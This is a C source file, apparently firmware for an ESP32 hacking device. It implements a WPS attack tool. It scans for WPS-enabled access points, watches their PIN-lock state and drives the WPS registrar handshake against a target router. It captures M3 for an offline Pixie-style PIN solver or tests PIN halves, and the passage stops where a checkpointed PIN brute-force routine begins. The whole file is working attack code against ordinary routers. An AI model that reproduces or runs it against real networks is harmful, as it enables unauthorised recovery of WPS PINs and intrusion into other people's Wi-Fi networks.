#include "bruce_wifite.h"
#include "bruce_wifite_platform.h"
#include "link.h"
#include "sdk_adapter.h"
#include <esp_event.h>
#include <esp_heap_caps.h>
#include <esp_random.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/queue.h>

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <time.h>

#define RX_MAX 1600
typedef struct {
  uint32_t captured_at;
  uint16_t len;
  int8_t rssi;
  uint8_t channel;
  bool eapol;
  uint8_t p[RX_MAX];
} Frame;
struct WifiteJob {
  WifiteMode mode;
  WfTarget target;
  char pin[9];
  TaskHandle_t thread;
  QueueHandle_t events;
  QueueHandle_t rx;
  StaticQueue_t rx_control;
  uint8_t *rx_storage;
  Frame *scratch, *eap_scratch, *frame;
  WfSession *session;
  uint32_t cancel, finished, refs, dropped;
  bool leased, registered, link_installed;
  esp_event_handler_instance_t event_instance;
  uint32_t active_exchange, link_ready, disconnect_reason, connected_channel,
      rx_auth, rx_assoc, rx_eapol;
  unsigned tx_eapol;
  esp_err_t error;
  uint8_t mac[6], bssid[6], channel;
  uint8_t tx[RX_MAX];
  size_t tx_len;
  unsigned log_dropped;
  unsigned outcome; /* 1=first-half NACK, 2=second-half NACK, 3=lock */
  uint32_t progress_at;
  const char *progress_phase;
};
static portMUX_TYPE gate = portMUX_INITIALIZER_UNLOCKED;
static WifiteJob *owner;
static uint32_t now(void) { return (uint32_t)(esp_timer_get_time() / 1000); }
static bool cancelled(WifiteJob *j) {
  return __atomic_load_n(&j->cancel, __ATOMIC_ACQUIRE) != 0;
}
static void logline(WifiteJob *j, const char *fmt, ...) {
  WifiteEvent e = {.type = WifiteLog};
  va_list a;
  va_start(a, fmt);
  vsnprintf(e.text, sizeof(e.text), fmt, a);
  va_end(a);
  if (wf_queue_put(j->events, &e, 20) != pdTRUE)
    j->log_dropped++;
}
static WifiteJob *acquire_job(void) {
  portENTER_CRITICAL(&gate);
  WifiteJob *j = owner;
  if (j)
    j->refs++;
  portEXIT_CRITICAL(&gate);
  return j;
}
static void release_job(WifiteJob *j) {
  portENTER_CRITICAL(&gate);
  j->refs--;
  portEXIT_CRITICAL(&gate);
}
static bool link_accept(const uint8_t *bssid) {
  WifiteJob *j = acquire_job();
  if (!j)
    return false;
  bool accepted = __atomic_load_n(&j->active_exchange, __ATOMIC_ACQUIRE) &&
                  !memcmp(j->bssid, bssid, 6);
  release_job(j);
  return accepted;
}
static void link_ready(void) {
  WifiteJob *j = acquire_job();
  if (!j)
    return;
  if (__atomic_load_n(&j->active_exchange, __ATOMIC_ACQUIRE))
    __atomic_store_n(&j->link_ready, 1, __ATOMIC_RELEASE);
  release_job(j);
}
static void link_receive(const uint8_t *src, const uint8_t *eapol, size_t n) {
  WifiteJob *j = acquire_job();
  if (!j)
    return;
  if (__atomic_load_n(&j->active_exchange, __ATOMIC_ACQUIRE) &&
      !memcmp(src, j->bssid, 6) && n >= 4 && n <= RX_MAX) {
    Frame *f = j->eap_scratch;
    f->captured_at = now();
    f->eapol = true;
    f->len = n;
    f->rssi = 0;
    f->channel = 0;
    memcpy(f->p, eapol, n);
    __atomic_fetch_add(&j->rx_eapol, 1, __ATOMIC_RELAXED);
    if (xQueueSend(j->rx, f, 0) != pdTRUE)
      __atomic_fetch_add(&j->dropped, 1, __ATOMIC_RELAXED);
  }
  release_job(j);
}
static void wifi_event(void *arg, esp_event_base_t base, int32_t id,
                       void *data) {
  (void)arg;
  (void)base;
  if (!data || (id != WIFI_EVENT_STA_DISCONNECTED && id != WIFI_EVENT_STA_CONNECTED))
    return;
  WifiteJob *j = acquire_job();
  if (!j)
    return;
  if (__atomic_load_n(&j->active_exchange, __ATOMIC_ACQUIRE)) {
    if (id == WIFI_EVENT_STA_CONNECTED) {
      const wifi_event_sta_connected_t *d = data;
      if (!memcmp(d->bssid, j->bssid, 6))
        __atomic_store_n(&j->connected_channel, d->channel, __ATOMIC_RELEASE);
    } else {
      const wifi_event_sta_disconnected_t *d = data;
      if (!memcmp(d->bssid, j->bssid, 6))
        __atomic_store_n(&j->disconnect_reason, d->reason, __ATOMIC_RELEASE);
    }
  }
  release_job(j);
}
static void receive(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA)
    return;
  portENTER_CRITICAL(&gate);
  WifiteJob *j = owner;
  if (j)
    j->refs++;
  portEXIT_CRITICAL(&gate);
  if (!j)
    return;
  const wifi_promiscuous_pkt_t *p = buf;
  size_t n = p->rx_ctrl.sig_len;
  if (n >= 28 && n <= RX_MAX + 4 && p->rx_ctrl.rx_state == 0) {
    n -= 4;
    const uint8_t *b = p->payload;
    bool wanted =
        j->mode == WifiteScan
            ? (b[0] == 0x80 || b[0] == 0x50 || (b[0] & 0x0c) == 8)
            : ((!memcmp(b + 10, j->bssid, 6)) &&
               (!memcmp(b + 4, j->mac, 6) || b[0] == 0x80 || b[0] == 0x50));
    if (wanted) {
      j->scratch->captured_at = now();
      j->scratch->eapol = false;
      if (b[0] == 0xb0)
        __atomic_fetch_add(&j->rx_auth, 1, __ATOMIC_RELAXED);
      if (b[0] == 0x10)
        __atomic_fetch_add(&j->rx_assoc, 1, __ATOMIC_RELAXED);
      j->scratch->len = n;
      j->scratch->rssi = p->rx_ctrl.rssi;
      j->scratch->channel = p->rx_ctrl.channel;
      memcpy(j->scratch->p, b, n);
      if (xQueueSend(j->rx, j->scratch, 0) != pdTRUE)
        __atomic_fetch_add(&j->dropped, 1, __ATOMIC_RELAXED);
    }
  }
  portENTER_CRITICAL(&gate);
  j->refs--;
  portEXIT_CRITICAL(&gate);
}
static void setup(void *ctx) {
  WifiteJob *j = ctx;
  wifi_promiscuous_filter_t f = {
      .filter_mask =
          WIFI_PROMIS_FILTER_MASK_MGMT |
          (j->mode == WifiteScan ? WIFI_PROMIS_FILTER_MASK_DATA : 0)};
  j->error = esp_wifi_get_mac(WIFI_IF_STA, j->mac);
  if (j->error == ESP_OK)
    j->error = esp_wifi_set_ps(WIFI_PS_NONE);
  if (j->error == ESP_OK)
    j->error = esp_wifi_set_promiscuous_filter(&f);
  if (j->error == ESP_OK)
    j->error = esp_wifi_set_promiscuous_rx_cb(receive);
  if (j->error == ESP_OK) {
    j->registered = true;
    j->error = esp_wifi_set_promiscuous(true);
  }
  if (j->error == ESP_OK && j->mode != WifiteScan) {
    j->error = esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, wifi_event, NULL,
        &j->event_instance);
    if (j->error == ESP_OK) {
      const WfLinkCallbacks cb = {link_accept, link_ready, link_receive};
      j->error = wf_link_install(&cb);
      j->link_installed = j->error == ESP_OK;
    }
  }
}
static void teardown(void *ctx) {
  WifiteJob *j = ctx;
  if (j->link_installed) {
    wf_link_uninstall();
    j->link_installed = false;
  }
  if (j->event_instance) {
    esp_event_handler_instance_unregister(
        WIFI_EVENT, ESP_EVENT_ANY_ID, j->event_instance);
    j->event_instance = NULL;
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  j->registered = false;
}
static void change_channel(void *ctx) {
  WifiteJob *j = ctx;
  j->error = esp_wifi_set_channel(j->channel, WIFI_SECOND_CHAN_NONE);
}
static void listen_worker(void *ctx) {
  WifiteJob *j = ctx;
  j->error = esp_wifi_set_promiscuous(true);
}
static bool channel(WifiteJob *j, unsigned ch) {
  j->channel = ch;
  return wlan_hal_survey_run(change_channel, j) && j->error == ESP_OK;
}
static bool radio_open(WifiteJob *j) {
  logline(j, "[RADIO] Acquiring exclusive Wi-Fi");
  if (!wlan_hal_survey_begin(true)) {
    logline(j, "[ERR] %s", wlan_hal_survey_status());
    return false;
  }
  j->leased = true;
  portENTER_CRITICAL(&gate);
  bool busy = owner != NULL;
  if (!busy)
    owner = j;
  portEXIT_CRITICAL(&gate);
  if (busy) {
    logline(j, "[ERR] WIFITE already active");
    return false;
  }
  if (!wlan_hal_survey_run(setup, j) || j->error != ESP_OK) {
    logline(j, "[ERR] RX setup: %s", esp_err_to_name(j->error));
    return false;
  }
  return true;
}
static void radio_close(WifiteJob *j) {
  portENTER_CRITICAL(&gate);
  if (owner == j)
    owner = NULL;
  portEXIT_CRITICAL(&gate);
  if (j->registered)
    wlan_hal_survey_run(teardown, j);
  for (;;) {
    portENTER_CRITICAL(&gate);
    unsigned refs = j->refs;
    portEXIT_CRITICAL(&gate);
    if (!refs)
      break;
    wf_delay(5);
  }
  if (j->leased) {
    wlan_hal_survey_end();
    j->leased = false;
    logline(j, "[RADIO] %s", wlan_hal_survey_status());
  }
}
static void connect_worker(void *ctx) {
  WifiteJob *j = ctx;
  j->error = wf_link_connect(&j->target);
}
static void disconnect_worker(void *ctx) {
  (void)ctx;
  wf_link_disconnect();
}
static void tx_worker(void *ctx) {
  WifiteJob *j = ctx;
  j->error = wf_link_send(j->tx, j->tx_len);
}
static bool transmit(WifiteJob *j, const uint8_t *frame, size_t n) {
  if (n > sizeof(j->tx) || n < 18 || cancelled(j))
    return false;
  if (frame != j->tx)
    memcpy(j->tx, frame, n);
  j->tx_len = n;
  if (!wlan_hal_survey_run(tx_worker, j) || j->error != ESP_OK) {
    logline(j, "[!] EAPOL TX failed: %s", esp_err_to_name(j->error));
    return false;
  }
  j->tx_eapol++;
  return true;
}
static bool send_eap(WifiteJob *j, int kind, uint8_t id, uint8_t op,
                     const uint8_t *msg, size_t mn) {
  uint8_t *p = j->tx;
  memcpy(p, j->bssid, 6);
  memcpy(p + 6, j->mac, 6);
  p[12] = 0x88;
  p[13] = 0x8e;
  size_t n =
      wf_eapol_response(p + 14, sizeof(j->tx) - 14, kind, id, op, msg, mn);
  if (!n || !transmit(j, p, 14 + n))
    return false;
  if (kind == 0)
    logline(j, "[+] Sending EAPOL-Start");
  else if (kind == 1)
    logline(j, "[+] Sending EAP Identity Response");
  else if (op == 4) {
    size_t z = 0;
    const uint8_t *type = wf_attr(msg, mn, 0x1022, &z);
    if (type && z == 1)
      logline(j, "[+] Sending WPS M%u",
              *type == 5    ? 2
              : *type == 8  ? 4
              : *type == 10 ? 6
                            : 0);
  }
  return true;
}
static void scan(WifiteJob *j) {
  WfTarget *table = calloc(WF_TARGET_MAX, sizeof(WfTarget));
  if (!table) {
    logline(j, "[ERR] No scan memory");
    return;
  }
  uint8_t (*clients)[12] = calloc(128, 12);
  unsigned client_count = 0;
  unsigned count = 0;
  wifi_country_t country = {0};
  unsigned first = 1, last = 11;
  if (esp_wifi_get_country(&country) == ESP_OK && country.schan >= 1 &&
      country.nchan && country.schan + country.nchan <= 15) {
    first = country.schan;
    last = first + country.nchan - 1;
  }
  logline(j, "[SCAN] Passive network scan CH%u-%u", first, last);
  logline(j, "[SCAN] WPS support, PIN lock and observed clients");
  for (unsigned lap = 0; lap < 3 && !cancelled(j); lap++)
    for (unsigned ch = first; ch <= last && !cancelled(j); ch++) {
      if (!channel(j, ch)) {
        logline(j, "[ERR] Cannot tune CH%u", ch);
        continue;
      }
      uint32_t start = now();
      while (!cancelled(j) && now() - start < 400)
        if (xQueueReceive(j->rx, j->frame, pdMS_TO_TICKS(40))) {
          const uint8_t *f = j->frame->p;
          if (clients && j->frame->len >= 24 && (f[0] & 0x0c) == 8 &&
              ((f[1] & 3) == 1 || (f[1] & 3) == 2)) {
            const uint8_t *ap = (f[1] & 3) == 1 ? f + 4 : f + 10;
            const uint8_t *sta = (f[1] & 3) == 1 ? f + 10 : f + 4;
            if (!(sta[0] & 1) && memcmp(sta, ap, 6)) {
              unsigned k = 0;
              while (k < client_count && (memcmp(clients[k], ap, 6) ||
                                          memcmp(clients[k] + 6, sta, 6)))
                k++;
              if (k == client_count && client_count < 128) {
                memcpy(clients[k], ap, 6);
                memcpy(clients[k] + 6, sta, 6);
                client_count++;
                for (unsigned a = 0; a < count; a++)
                  if (!memcmp(table[a].bssid, ap, 6)) {
                    table[a].clients++;
                    WifiteEvent e = {.type = WifiteTarget, .target = table[a]};
                    wf_queue_put(j->events, &e, 20);
                    break;
                  }
              }
            }
            continue;
          }
          WfTarget t;
          if (!wf_scan_beacon(f, j->frame->len, &t))
            continue;
          for (unsigned k = 0; k < client_count; k++)
            if (!memcmp(clients[k], t.bssid, 6))
              t.clients++;
          t.rssi = j->frame->rssi;
          if (!t.channel)
            t.channel = j->frame->channel;
          unsigned i = 0;
          while (i < count && memcmp(table[i].bssid, t.bssid, 6))
            i++;
          if (i == count) {
            if (count == WF_TARGET_MAX)
              continue;
            count++;
          }
          /* A beacon without a WPS IE cannot erase a probe response that
           * advertised WPS earlier in this scan. Retain its last report. */
          if (!t.wps && table[i].wps) {
            t.wps = table[i].wps;
            t.locked = table[i].locked;
            t.selected = table[i].selected;
            t.version = table[i].version;
            t.methods = table[i].methods;
            memcpy(t.manufacturer, table[i].manufacturer, sizeof(t.manufacturer));
            memcpy(t.model, table[i].model, sizeof(t.model));
          }
          bool changed = memcmp(&table[i], &t, sizeof(t)) != 0;
          table[i] = t;
          if (changed) {
            WifiteEvent e = {.type = WifiteTarget, .target = t};
            wf_queue_put(j->events, &e, 20);
          }
        }
    }
  unsigned wps_count = 0;
  for (unsigned i = 0; i < count; i++) {
    wps_count += table[i].wps != 0;
    /* Final snapshots repair any progress event dropped by a full UI queue. */
    WifiteEvent e = {.type = WifiteTarget, .target = table[i]};
    while (!cancelled(j) && wf_queue_put(j->events, &e, 100) != pdTRUE) {}
  }
  logline(j, "[SCAN] %u APs; %u advertise WPS", count, wps_count);
  logline(j, "[SCAN] Clients are observed traffic, not a live AP list");
  free(table);
  free(clients);
}
static bool fresh_target(WifiteJob *j) {
  /* Restore passive RX only between sessions, including after an offline search. */
  if (!wlan_hal_survey_run(listen_worker, j) || j->error != ESP_OK) {
    logline(j, "[ERR] Beacon RX: %s", esp_err_to_name(j->error));
    return false;
  }
  if (!channel(j, j->target.channel)) {
    logline(j, "[ERR] Channel unavailable");
    return false;
  }
  xQueueReset(j->rx);
  uint32_t start = now();
  WfLockWatch watch = {0};
  int previous = -2;
  bool reported_lock = false;
  unsigned next_notice = 10000;
  logline(j, "[WPS] Checking fresh AP PIN-lock flag");
  while (!cancelled(j) && now() - start < (watch.saw_lock ? 30000u : 3500u)) {
    if (watch.saw_lock && now() - start >= next_notice) {
      logline(j, "[WAIT] PIN-lock clearance: %us left",
              (30000u - (now() - start)) / 1000u);
      next_notice += 10000;
    }
    if (xQueueReceive(j->rx, j->frame, pdMS_TO_TICKS(50))) {
      WfTarget t;
      if (!j->frame->eapol && (int32_t)(j->frame->captured_at - start) >= 0 &&
          j->frame->channel == j->target.channel &&
          wf_beacon(j->frame->p, j->frame->len, &t) &&
          !memcmp(j->frame->p + 10, j->target.bssid, 6) &&
          !memcmp(t.bssid, j->target.bssid, 6)) {
        if (!t.ssid_len) {
          logline(j, "[ERR] Hidden SSID: association unsupported");
          return false;
        }
        t.channel = j->target.channel;
        t.rssi = j->frame->rssi;
        t.clients = j->target.clients;
        uint16_t sequence = (j->frame->p[22] | j->frame->p[23] << 8) >> 4;
        WfLockState state = wf_lock_observe(&watch, t.locked, sequence,
                                           j->frame->captured_at);
        if (t.locked != previous) {
          logline(j, "[WPS] %s AP Setup Locked (0x1057)=%d",
                  j->frame->p[0] == 0x80 ? "Beacon" : "Probe response", t.locked);
          previous = t.locked;
        }
        if (watch.saw_lock && !reported_lock) {
          logline(j, "[WAIT] AP reports PIN lock; passive check up to 30s");
          reported_lock = true;
        }
        if (state == WfLockPending)
          continue;
        if (memcmp(&j->target, &t, sizeof(t))) {
          j->target = t;
          WifiteEvent e = {.type = WifiteTarget, .target = t};
          wf_queue_put(j->events, &e, 20);
        }
        if (state == WfLockSet)
          continue;
        logline(j, state == WfLockClear ? "[WPS] Fresh packets confirm PIN lock=0"
                                       : "[WPS] Lock flag absent; state unknown");
        return true;
      }
    }
  }
  if (!cancelled(j)) {
    if (watch.saw_lock) {
      j->outcome = 3;
      logline(j, "[STOP] AP PIN lock did not clear within 30s");
      logline(j, "[WPS] PIN lock and WPS enabled are separate states");
    } else
      logline(j, "[ERR] No consistent fresh WPS status; test stopped");
  }
  return false;
}
static const char *disconnect_name(unsigned reason) {
  switch (reason) {
  case WIFI_REASON_AUTH_EXPIRE: return "AUTH_EXPIRE (authentication timeout)";
  case WIFI_REASON_AUTH_FAIL: return "AUTH_FAIL";
  case WIFI_REASON_ASSOC_EXPIRE: return "ASSOC_EXPIRE";
  case WIFI_REASON_ASSOC_FAIL: return "ASSOC_FAIL";
  case WIFI_REASON_NO_AP_FOUND: return "NO_AP_FOUND";
  case WIFI_REASON_BEACON_TIMEOUT: return "BEACON_TIMEOUT";
  case WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT: return "4WAY_HANDSHAKE_TIMEOUT";
  default: return "driver/AP disconnect";
  }
}
/* One bounded exchange. Returns M3 for capture; M7 for PIN verification.
 * Identical WSC payloads reuse the last complete response and crypto state,
 * including when the AP changes its EAP identifier. */
static bool exchange(WifiteJob *j, const char *pin) {
  j->outcome = 0;
  WfSession *s = j->session;
  memset(s, 0, sizeof(*s));
  xQueueReset(j->rx);
  uint8_t *reply = malloc(WF_MSG_MAX), *request = malloc(WF_MSG_MAX),
          *saved = malloc(RX_MAX);
  WfFragments *fragment = calloc(1, sizeof(*fragment));
  if (!reply || !request || !saved || !fragment) {
    logline(j, "[ERR] Exchange allocation failed");
    free(reply);
    free(request);
    free(saved);
    free(fragment);
    return false;
  }
  size_t saved_n = 0, request_n = 0, cached_reply_n = 0;
  uint8_t last_id = 0;
  bool have_request = false, ok = false;
  unsigned state = 0, retries = 0;
  unsigned reported_reason = 0, reported_channel = 0;
  WfSdkStatus sdk = {0}, reported_sdk = {0};
  WfLockWatch active_lock = {0};
  uint32_t session_start = now(), step = now();
  __atomic_store_n(&j->link_ready, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&j->disconnect_reason, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&j->connected_channel, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&j->rx_auth, 0, __ATOMIC_RELAXED);
  __atomic_store_n(&j->rx_assoc, 0, __ATOMIC_RELAXED);
  __atomic_store_n(&j->rx_eapol, 0, __ATOMIC_RELAXED);
  j->tx_eapol = 0;
  __atomic_store_n(&j->active_exchange, 1, __ATOMIC_RELEASE);
  logline(j, "[LINK] CH%u RSSI=%d dBm", j->target.channel, j->target.rssi);
  logline(j, "[+] Starting authentication / association");
  if (!wlan_hal_survey_run(connect_worker, j) || j->error != ESP_OK) {
    logline(j, "[!] Driver connect failed: %s", esp_err_to_name(j->error));
    goto done;
  }
  logline(j, "[SDK] WPS initialized; target scan started");
  while (!cancelled(j) && now() - session_start < 45000) {
    wf_sdk_status(&sdk);
    if (sdk.seen && !reported_sdk.seen)
      logline(j, "[SDK] Selected router found in driver scan");
    if (sdk.connecting && !reported_sdk.connecting)
      logline(j, "[SDK] Authentication / association queued");
    if (sdk.error != ESP_OK) {
      logline(j, "[SDK] Transport error: %s", esp_err_to_name(sdk.error));
      break;
    }
    reported_sdk = sdk;
    unsigned reason = __atomic_load_n(&j->disconnect_reason, __ATOMIC_ACQUIRE);
    if (reason && reason != reported_reason) {
      logline(j, "[LINK] reason=%u %s", reason, disconnect_name(reason));
      reported_reason = reason;
    }
    unsigned connected = __atomic_load_n(&j->connected_channel, __ATOMIC_ACQUIRE);
    if (connected && connected != reported_channel) {
      logline(j, "[LINK] STA connected on CH%u", connected);
      reported_channel = connected;
    }
    if (state < 2 && __atomic_load_n(&j->link_ready, __ATOMIC_ACQUIRE)) {
      state = 2;
      step = now();
      retries = 0;
      logline(j, "[+] Associated; WPS link ready");
      if (!send_eap(j, 0, 0, 0, NULL, 0))
        break;
      saved_n = j->tx_len;
      memcpy(saved, j->tx, saved_n);
    }
    if (state < 2 && now() - session_start >= 20000) {
      logline(j, sdk.seen ? "[!] Timeout: driver association incomplete"
                          : "[!] Timeout: driver did not find selected router");
      break;
    }
    if (state >= 2 && now() - step > 4500) {
      if (++retries > 2) {
        logline(j, "[!] Timeout waiting for %s",
                state == 2   ? "EAP Identity / WPS M1"
                : state == 3 ? "WPS M3"
                : state == 4 ? "WPS M5"
                             : "WPS M7");
        break;
      }
      logline(j, "[RETRY] EAPOL response %u/2", retries);
      if (!transmit(j, saved, saved_n))
        break;
      step = now();
    }
    if (!xQueueReceive(j->rx, j->frame, pdMS_TO_TICKS(50)))
      continue;
    const uint8_t *p = j->frame->p;
    size_t n = j->frame->len;
    if (!j->frame->eapol) {
      WfTarget observed;
      if ((int32_t)(j->frame->captured_at - session_start) >= 0 &&
          wf_beacon(p, n, &observed) && !memcmp(observed.bssid, j->bssid, 6) &&
          wf_lock_observe(&active_lock, observed.locked,
                          (p[22] | p[23] << 8) >> 4, j->frame->captured_at) == WfLockSet) {
        j->outcome = 3;
        logline(j, "[LOCKED] Fresh packets confirm AP PIN lock");
        break;
      }
      if (n >= 30 && !memcmp(p + 4, j->mac, 6) &&
          !memcmp(p + 10, j->bssid, 6)) {
        if (p[0] == 0xb0) {
          unsigned status = p[28] | p[29] << 8;
          logline(j, "[RX] Authentication response: %u", status);
        }
        if (p[0] == 0x10) {
          unsigned status = p[26] | p[27] << 8;
          logline(j, "[RX] Association response: %u", status);
        }
      }
      continue;
    }
    bool sent = false;
    if (state >= 2) {
      WfEap e = wf_eapol(p, n);
      if (e.kind == WfUnrelated)
        continue;
      if (e.kind == WfEapFailure) {
        logline(j, "[AP] EAP Failure received");
        break;
      }
      if (e.kind == WfIdentity) {
        if (state > 2) {
          logline(j, "[AP] EAP restarted; stopping exchange");
          break;
        }
        logline(j, "[+] Received EAP Identity Request");
        sent = send_eap(j, 1, e.id, 0, NULL, 0);
        if (!sent)
          break;
      } else if (e.kind == WfWsc) {
        if (e.opcode == 4) {
          int assembled = wf_reassemble(fragment, &e);
          if (assembled < 0) {
            logline(j, "[ERR] Invalid/oversized WSC fragments");
            break;
          }
          if (assembled == 2) {
            if (!transmit(j, saved, saved_n))
              break;
            continue;
          }
          if (assembled == 0) {
            if (!send_eap(j, 2, e.id, 6, NULL, 0))
              break;
            saved_n = j->tx_len;
            memcpy(saved, j->tx, saved_n);
            step = now();
            retries = 0;
            continue;
          }
        }
        if (e.opcode == 3) {
          size_t ne = 0, nr = 0, nc = 0;
          const uint8_t *en = wf_attr(e.data, e.len, 0x101a, &ne),
                        *rn = wf_attr(e.data, e.len, 0x1039, &nr),
                        *ce = wf_attr(e.data, e.len, 0x1009, &nc);
          if (en && rn && ce && ne == 16 && nr == 16 && nc == 2 &&
              !memcmp(en, s->enonce, 16) && !memcmp(rn, s->rnonce, 16) &&
              wf_be16(ce) == 15) {
            j->outcome = 3;
            logline(j, "[LOCKED] WSC reports setup locked");
          } else if (en && rn && ce && ne == 16 && nr == 16 && nc == 2 &&
              !memcmp(en, s->enonce, 16) && !memcmp(rn, s->rnonce, 16) &&
              wf_be16(ce) == 18) {
            if (state == 4)
              j->outcome = 1;
            else if (state == 6)
              j->outcome = 2;
          }
          logline(j, "[AP] WSC NACK; config error=%d",
                  ce && nc == 2 ? (int)wf_be16(ce) : -1);
          logline(j, j->outcome == 1 ? "[PIN] First half rejected (not a lock)"
                     : j->outcome == 2 ? "[PIN] Second half rejected (not a lock)"
                     : j->outcome == 3 ? "[WPS] Session reports AP PIN lock"
                                       : "[PIN] No conclusive PIN rejection");
          break;
        }
        if (e.opcode != 4 || e.len > WF_MSG_MAX)
          continue;
        if (have_request && e.len == request_n &&
            !memcmp(e.data, request, e.len)) {
          /* Some APs repeat a WSC request with a new EAP ID. Re-encode the
           * EAP header for that ID, but keep the exact authenticated WSC body.
           * 'saved' may contain a fragment ACK, so use the complete reply. */
          logline(j, "[RETRY] Same WPS request; EAP id %u -> %u",
                  (unsigned)last_id, (unsigned)e.id);
          if (!cached_reply_n ||
              !send_eap(j, 2, e.id, 4, reply, cached_reply_n))
            break;
          last_id = e.id;
          saved_n = j->tx_len;
          memcpy(saved, j->tx, saved_n);
          step = now();
          retries = 0;
          continue;
        }
        if (have_request && e.id == last_id) {
          logline(j, "[ERR] Changed payload for same EAP ID");
          break;
        }
        size_t z = 0;
        const uint8_t *mt = wf_attr(e.data, e.len, 0x1022, &z);
        if (!mt || z != 1) {
          logline(j, "[ERR] Malformed WSC message");
          break;
        }
        size_t reply_n = 0;
        if (*mt == 4 && state == 2) {
          logline(j, "[+] Received WPS M1; deriving keys");
          uint8_t x[32], r[16];
          esp_fill_random(x, 32);
          x[0] |= 0x80;
          esp_fill_random(r, 16);
          bool built = wf_m2(s, e.data, e.len, x, r, reply, &reply_n);
          wf_wipe(x, 32);
          wf_wipe(r, 16);
          if (!built) {
            logline(j, "[ERR] M1/key derivation invalid");
            break;
          }
          /* Enrollee identity must match the selected AP. */
          if (memcmp(s->mac, j->target.bssid, 6)) {
            logline(j, "[ERR] M1 MAC differs from selected AP");
            break;
          }
          state = 3;
        } else if (*mt == 7 && state == 3) {
          if (!wf_m3(s, e.data, e.len)) {
            logline(j, "[ERR] M3 integrity/nonce check failed");
            break;
          }
          logline(j, "[+] Received WPS M3; hashes validated");
          if (!pin) {
            ok = true;
            break;
          }
          memcpy(s->pin, pin, 9);
          uint8_t random[48];
          esp_fill_random(random, 48);
          bool built = wf_m4(s, random, reply, &reply_n);
          wf_wipe(random, 48);
          if (!built) {
            logline(j, "[ERR] M4 construction failed");
            break;
          }
          state = 4;
        } else if (*mt == 9 && state == 4) {
          uint8_t iv[16];
          esp_fill_random(iv, 16);
          if (!wf_m6(s, e.data, e.len, iv, reply, &reply_n)) {
            logline(j, "[ERR] M5/PIN half validation failed");
            break;
          }
          state = 6;
          logline(j, "[+] Received WPS M5; first half valid");
        } else if (*mt == 11 && state == 6) {
          if (!wf_m7(s, e.data, e.len)) {
            logline(j, "[ERR] M7 authentication/settings invalid");
            break;
          }
          logline(j, "[+] Received WPS M7; key validated");
          ok = true;
          break;
        } else {
          if (*mt == 4 && state == 3)
            logline(j, "[AP] M1 changed while waiting for M3; session incomplete");
          logline(j, "[DIAG] EAP id=%u; expecting WPS M%u",
                  (unsigned)e.id, state == 2 ? 1 : state == 3 ? 3
                                               : state == 4 ? 5 : 7);
          logline(j, "[ERR] Unexpected WPS message 0x%02x", *mt);
          break;
        }
        memcpy(request, e.data, e.len);
        request_n = e.len;
        last_id = e.id;
        have_request = true;
        cached_reply_n = reply_n;
        sent = send_eap(j, 2, e.id, 4, reply, reply_n);
        if (!sent)
          break;
      }
    }
    if (sent) {
      step = now();
      retries = 0;
      saved_n = j->tx_len;
      memcpy(saved, j->tx, saved_n);
    }
  }
  if (!ok && !cancelled(j) && now() - session_start >= 45000)
    logline(j, "[TIMEOUT] 45-second exchange limit");
done:
  wf_sdk_status(&sdk);
  logline(j, "[SDK] scans=%lu seen=%lu connect=%lu ready=%lu",
          (unsigned long)sdk.scans, (unsigned long)sdk.seen,
          (unsigned long)sdk.connecting, (unsigned long)sdk.ready);
  __atomic_store_n(&j->active_exchange, 0, __ATOMIC_RELEASE);
  wlan_hal_survey_run(disconnect_worker, j);
  logline(j, "[DIAG] WPS-ready=%lu EAP_RX=%lu EAP_TX=%u",
          (unsigned long)__atomic_load_n(&j->link_ready, __ATOMIC_RELAXED),
          (unsigned long)__atomic_load_n(&j->rx_eapol, __ATOMIC_RELAXED),
          j->tx_eapol);
  if (!__atomic_load_n(&j->rx_eapol, __ATOMIC_RELAXED))
    logline(j, "[LINK] No EAP received; PIN was not verified");
  unsigned reason = __atomic_load_n(&j->disconnect_reason, __ATOMIC_ACQUIRE);
  if (reason)
    logline(j, "[DIAG] reason=%u %s", reason, disconnect_name(reason));
  wf_wipe(reply, reply ? WF_MSG_MAX : 0);
  wf_wipe(request, request ? WF_MSG_MAX : 0);
  wf_wipe(saved, saved ? RX_MAX : 0);
  wf_wipe(fragment, sizeof(*fragment));
  free(reply);
  free(request);
  free(saved);
  free(fragment);
  return ok;
}
static bool solver_progress(void *ctx, const char *phase, uint64_t done,
                            uint64_t total) {
  WifiteJob *j = ctx;
  uint32_t t = now();
  if (j->progress_phase != phase || t - j->progress_at >= 2000) {
    logline(j, "[PIXIE] %s", phase);
    logline(j, "[PROGRESS] %llu/%llu", (unsigned long long)done,
            (unsigned long long)total);
    j->progress_phase = phase;
    j->progress_at = t;
  }
  wf_delay(1);
  return !cancelled(j);
}
static void checkpoint_path(WifiteJob *j, char path[96]) {
  snprintf(path, 96, "/ext/apps_data/wifite/bf-%02X%02X%02X%02X%02X%02X.txt",
           j->target.bssid[0], j->target.bssid[1], j->target.bssid[2],
           j->target.bssid[3], j->target.bssid[4], j->target.bssid[5]);
}
static void checkpoint(WifiteJob *j, WfBrute *b, bool load, bool remove) {
  char path[96], text[96]; checkpoint_path(j, path);
  if (remove) { wf_checkpoint_remove(path); return; }
  bool ok = false;
  if (load) {
    size_t n = wf_checkpoint_read(path, text, sizeof(text)-1);
    text[n] = 0;
    WfBrute got = {0}; char pin[9]; int used = 0;
    if (n && sscanf(text, "WFB1 %u %u %u %n", &got.first, &got.second, &got.phase, &used)==3 &&
        used > 0 && (size_t)used == n && wf_brute_pin(&got,pin)) {
      *b = got; ok = true;
    }
    if(ok) logline(j,"[RESUME] first=%u second=%u phase=%u", b->first,b->second,b->phase);
  } else {
    snprintf(text,sizeof(text),"WFB1 %u %u %u\n",b->first,b->second,b->phase);
    if(!wf_checkpoint_write(path,text)) logline(j,"[SD] Could not save PIN-search checkpoint");
  }
}
static bool brute_force(WifiteJob *j) {
  WfBrute b = {0};
  checkpoint(j, &b, true, false);
  unsigned ambiguous = 0, attempts = 0;
  logline(j, "[BRUTE] WPS 4+3 digits with checksum");
